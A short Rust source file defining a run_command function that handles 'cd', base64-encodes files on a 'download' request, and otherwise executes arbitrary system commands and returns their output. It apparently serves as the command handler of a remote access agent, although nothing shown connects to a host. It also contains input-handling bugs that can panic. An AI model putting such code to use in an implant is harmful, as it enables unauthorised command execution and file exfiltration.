use crate::utils::base64::encode_file_to_base64::encode_file_to_base64;
use std::{
    env,
    io::{Error, ErrorKind},
    path::Path,
    process::Command,
};
use tracing::info;

pub fn run_command(text: &str) -> Result<String, Error> {
    let args: Vec<&str> = text.split_whitespace().collect();
    info!("Running command: {:?}", text);

    if args[0] == "cd" {
        if args.len() > 1 {
            let new_dir = args[1];
            let path = Path::new(new_dir);
            env::set_current_dir(path).map_err(|e| {
                info!("Failed to change directory: {}", e);
                Error::new(
                    ErrorKind::Other,
                    format!("Failed to change directory: {}", e),
                )
            })?;
            info!("Changed directory to: {}", new_dir);
            return Ok(format!("Changed directory to: {}", new_dir));
        } else {
            info!("No directory specified for 'cd' command.");
            return Err(Error::new(
                ErrorKind::InvalidInput,
                "No directory specified",
            ));
        }
    }

    if args[0] == "download" {
        if args.len() >= 1 {
            let file_path = args[1];
            let base64_file = encode_file_to_base64(&file_path);

            if base64_file.is_ok() {
                return Ok(String::from(format!(
                    "download--{}--{}",
                    file_path,
                    base64_file.unwrap()
                )));
            }

            return base64_file;
        }
    }

    let output = Command::new(args[0])
        .args(&args[1..])
        .output()
        .map_err(|e| {
            info!("Failed to execute command: {}", e);
            Error::new(
                ErrorKind::Other,
                format!("Failed to execute command: {}", e),
            )
        })?;

    let stdout = String::from_utf8_lossy(&output.stdout).to_string();

    info!("Command output: {}", stdout);

    Ok(stdout)
}
